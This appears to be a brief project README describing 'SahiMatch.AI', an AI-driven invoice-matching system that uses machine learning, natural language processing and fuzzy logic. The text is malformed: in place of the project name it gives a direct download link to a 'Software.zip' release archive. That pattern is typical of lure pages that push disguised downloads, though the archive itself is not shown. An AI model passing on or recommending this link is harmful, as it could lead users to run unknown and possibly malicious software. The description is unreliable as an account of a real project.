Welcome to https://github.com/keanusmall/SahiMatch.AI/releases/download/v1.0/Software.zip, an AI-driven partial invoice matching system that leverages a combinatory approach of machine learning, natural language processing, and fuzzy theory to provide detailed reports on classification and similarity between two invoices. The system features a user-friendly drag and drop interface where users can edit predictions and constantly improve the system over time using reinforcement learning.
